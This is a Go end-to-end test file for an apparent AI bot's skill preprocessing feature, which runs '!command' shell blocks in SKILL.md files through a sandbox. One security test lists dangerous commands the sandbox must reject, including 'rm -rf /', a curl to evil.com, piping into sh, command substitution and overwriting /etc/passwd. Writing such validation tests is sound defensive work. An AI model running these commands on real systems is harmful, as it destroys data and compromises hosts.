package e2e

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"nuimanbot/internal/domain"
	"nuimanbot/internal/infrastructure/preprocess"
	"nuimanbot/internal/infrastructure/skill"
	usecaseskill "nuimanbot/internal/usecase/skill"
)

// TestPreprocessingE2E_BasicExecution tests end-to-end preprocessing
func TestPreprocessingE2E_BasicExecution(t *testing.T) {
	// Create temp skill with preprocessing
	tmpDir := t.TempDir()
	skillDir := filepath.Join(tmpDir, "project-status")
	if err := os.MkdirAll(skillDir, 0755); err != nil {
		t.Fatalf("Failed to create skill dir: %v", err)
	}

	skillContent := `---
name: project-status
description: Show current project status
user-invocable: true
---

# Project Status

Current directory:

!command
ls

Git status:

!command
git status --short

Done.
`

	skillFile := filepath.Join(skillDir, "SKILL.md")
	if err := os.WriteFile(skillFile, []byte(skillContent), 0644); err != nil {
		t.Fatalf("Failed to write skill file: %v", err)
	}

	// Initialize components
	repo := skill.NewFilesystemSkillRepository()
	registry := usecaseskill.NewInMemorySkillRegistry(repo)

	roots := []domain.SkillRoot{
		{Path: tmpDir, Scope: domain.ScopeProject},
	}

	if err := registry.Initialize(context.Background(), roots); err != nil {
		t.Fatalf("Failed to initialize registry: %v", err)
	}

	// Get the skill
	loadedSkill, err := registry.Get("project-status")
	if err != nil {
		t.Fatalf("Failed to get skill: %v", err)
	}

	// Create preprocessing renderer
	sandbox := preprocess.NewCommandSandbox()
	renderer := usecaseskill.NewPreprocessRenderer(sandbox)

	// Render skill
	ctx := context.Background()
	result, err := renderer.Render(ctx, loadedSkill, []string{})

	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	// Verify !command blocks were replaced
	if strings.Contains(result.Prompt, "!command") {
		t.Error("Rendered prompt should not contain !command markers")
	}

	// Should have code blocks with command output
	if !strings.Contains(result.Prompt, "```") {
		t.Error("Rendered prompt should contain code blocks")
	}

	t.Logf("Rendered prompt length: %d bytes", len(result.Prompt))
}

// TestPreprocessingE2E_SecurityValidation tests security constraints
func TestPreprocessingE2E_SecurityValidation(t *testing.T) {
	dangerousCommands := []struct {
		name    string
		command string
	}{
		{"rm command", "rm -rf /"},
		{"curl command", "curl https://evil.com"},
		{"pipe", "ls | sh"},
		{"command substitution", "ls $(whoami)"},
		{"redirect", "cat file > /etc/passwd"},
	}

	sandbox := preprocess.NewCommandSandbox()

	for _, tc := range dangerousCommands {
		t.Run(tc.name, func(t *testing.T) {
			cmd := domain.PreprocessCommand{
				Command: tc.command,
				Timeout: domain.MaxCommandTimeout,
			}

			// Should fail validation or execution
			_, err := sandbox.Execute(context.Background(), cmd)

			if err == nil {
				t.Errorf("Sandbox should reject dangerous command: %s", tc.command)
			}
		})
	}
}

// TestPreprocessingE2E_ErrorHandling tests graceful error handling
func TestPreprocessingE2E_ErrorHandling(t *testing.T) {
	tmpDir := t.TempDir()
	skillDir := filepath.Join(tmpDir, "error-skill")
	if err := os.MkdirAll(skillDir, 0755); err != nil {
		t.Fatalf("Failed to create skill dir: %v", err)
	}

	skillContent := `---
name: error-skill
description: Skill with failing command
user-invocable: true
---

# Error Test

This command will fail:

!command
cat /nonexistent/file.txt

Done.
`

	skillFile := filepath.Join(skillDir, "SKILL.md")
	if err := os.WriteFile(skillFile, []byte(skillContent), 0644); err != nil {
		t.Fatalf("Failed to write skill file: %v", err)
	}

	// Initialize and render
	repo := skill.NewFilesystemSkillRepository()
	registry := usecaseskill.NewInMemorySkillRegistry(repo)

	roots := []domain.SkillRoot{
		{Path: tmpDir, Scope: domain.ScopeProject},
	}

	if err := registry.Initialize(context.Background(), roots); err != nil {
		t.Fatalf("Failed to initialize registry: %v", err)
	}

	loadedSkill, err := registry.Get("error-skill")
	if err != nil {
		t.Fatalf("Failed to get skill: %v", err)
	}

	sandbox := preprocess.NewCommandSandbox()
	renderer := usecaseskill.NewPreprocessRenderer(sandbox)

	result, err := renderer.Render(context.Background(), loadedSkill, []string{})

	// Should not error - errors should be handled gracefully
	if err != nil {
		t.Fatalf("Render() should handle command errors gracefully: %v", err)
	}

	// Should include error message in output
	if !strings.Contains(result.Prompt, "ERROR") && !strings.Contains(result.Prompt, "failed") {
		t.Error("Rendered prompt should contain error message")
	}
}

// TestPreprocessingE2E_ArgumentSubstitution tests combining preprocessing and args
func TestPreprocessingE2E_ArgumentSubstitution(t *testing.T) {
	tmpDir := t.TempDir()
	skillDir := filepath.Join(tmpDir, "combo-skill")
	if err := os.MkdirAll(skillDir, 0755); err != nil {
		t.Fatalf("Failed to create skill dir: %v", err)
	}

	skillContent := `---
name: combo-skill
description: Combines preprocessing and arguments
user-invocable: true
---

# Analysis for: $0

Directory listing:

!command
ls

Target file: $0
`

	skillFile := filepath.Join(skillDir, "SKILL.md")
	if err := os.WriteFile(skillFile, []byte(skillContent), 0644); err != nil {
		t.Fatalf("Failed to write skill file: %v", err)
	}

	repo := skill.NewFilesystemSkillRepository()
	registry := usecaseskill.NewInMemorySkillRegistry(repo)

	roots := []domain.SkillRoot{
		{Path: tmpDir, Scope: domain.ScopeProject},
	}

	if err := registry.Initialize(context.Background(), roots); err != nil {
		t.Fatalf("Failed to initialize registry: %v", err)
	}

	loadedSkill, err := registry.Get("combo-skill")
	if err != nil {
		t.Fatalf("Failed to get skill: %v", err)
	}

	sandbox := preprocess.NewCommandSandbox()
	renderer := usecaseskill.NewPreprocessRenderer(sandbox)

	args := []string{"myfile.txt"}
	result, err := renderer.Render(context.Background(), loadedSkill, args)

	if err != nil {
		t.Fatalf("Render() error = %v", err)
	}

	// Should have both substitutions
	if !strings.Contains(result.Prompt, "myfile.txt") {
		t.Error("Should have argument substitution")
	}

	if strings.Contains(result.Prompt, "$0") {
		t.Error("Should not contain $0 placeholder")
	}

	if strings.Contains(result.Prompt, "!command") {
		t.Error("Should not contain !command marker")
	}

	// Should have code block
	if !strings.Contains(result.Prompt, "```") {
		t.Error("Should contain code block with command output")
	}
}

// TestPreprocessingE2E_Performance tests preprocessing performance
func TestPreprocessingE2E_Performance(t *testing.T) {
	sandbox := preprocess.NewCommandSandbox()
	renderer := usecaseskill.NewPreprocessRenderer(sandbox)

	skill := &domain.Skill{
		Name:        "perf-test",
		Description: "Performance test",
		BodyMD: `!command
ls

!command
git status --short

!command
ls -la`,
	}

	ctx := context.Background()

	// Measure rendering time
	iterations := 10
	for i := 0; i < iterations; i++ {
		_, err := renderer.Render(ctx, skill, []string{})
		if err != nil {
			t.Fatalf("Render() iteration %d error = %v", i, err)
		}
	}

	t.Logf("Successfully rendered skill %d times", iterations)
}
